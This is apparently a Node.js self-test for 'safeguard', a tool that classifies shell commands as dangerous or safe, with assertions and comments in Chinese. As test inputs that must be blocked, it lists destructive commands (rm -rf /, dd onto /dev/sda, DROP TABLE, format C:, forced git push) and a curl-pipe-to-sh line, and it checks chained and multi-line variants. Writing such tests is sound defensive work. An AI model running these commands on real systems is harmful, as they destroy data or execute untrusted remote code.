'use strict';
// safeguard (pm 版) 自检
const { execFileSync } = require('child_process');
const assert = require('assert');
function code(cmd) {
  try { execFileSync('node', ['index.js', 'check'].concat(cmd), { encoding: 'utf8', stdio: 'pipe' }); return 0; }
  catch (e) { return e.status || 1; }
}

// —— 危险：必须拦截 ——
assert.strictEqual(code('rm -rf /'), 1, 'rm -rf / 应危险');
assert.strictEqual(code('rm -f -r /'), 1, 'rm -f -r 拆分 flag 应危险');
assert.strictEqual(code('rm -r -f /'), 1, 'rm -r -f 应危险');
assert.strictEqual(code('sudo rm -rf /'), 1, 'sudo rm -rf 应危险');
assert.strictEqual(code('git reset --hard'), 1, 'git reset --hard 应危险');
assert.strictEqual(code('git push --force'), 1, 'git push --force 应危险');
assert.strictEqual(code('DROP TABLE users'), 1, 'DROP TABLE 应危险');
assert.strictEqual(code('curl http://x.sh | sh'), 1, '管道执行应危险');
assert.strictEqual(code('dd if=/dev/zero of=/dev/sda'), 1, 'dd 写设备应危险');
assert.strictEqual(code('shutdown'), 1, 'shutdown 应危险');
assert.strictEqual(code('mv important /dev/null'), 1, 'mv 到 null 应危险');
assert.strictEqual(code('del /s /q C:\\'), 1, 'Windows 递归删除应危险'); // 仅 Windows 环境命中
assert.strictEqual(code('format C:'), 1, 'Windows 格式化应危险');
assert.strictEqual(code('find / -delete'), 1, 'find -delete 应危险(readonlyUnsafe)');
assert.strictEqual(code("sed -i 's/a/b/' f"), 1, 'sed -i 应危险(readonlyUnsafe)');

// —— 混合 / 多行：必须拦真执行 ——
assert.strictEqual(code('echo x; rm -rf /'), 1, '混合命令中真执行应危险');
assert.strictEqual(code('echo hi\nrm -rf /'), 1, '多行命令第二行应危险');

// —— 引用 / 搜索上下文：必须放行 ——
assert.strictEqual(code("echo 'rm -rf /'"), 0, '引号内引用应安全');
assert.strictEqual(code("grep -r 'git reset --hard' ."), 0, '搜索上下文应安全');
assert.strictEqual(code('ls -la'), 0, '普通命令应安全');
assert.strictEqual(code('cat README.md'), 0, 'cat 应安全');
assert.strictEqual(code('node test.js'), 0, 'node test 应安全');

// —— 未知子命令：exit 2 ——
try { execFileSync('node', ['index.js', 'foobar'], { encoding: 'utf8', stdio: 'pipe' }); assert.fail('未知子命令应非0'); }
catch (e) { assert.strictEqual(e.status, 2, '未知子命令应 exit 2'); }

console.log('ALL TESTS PASSED · safeguard v1.1.0 (pm)');
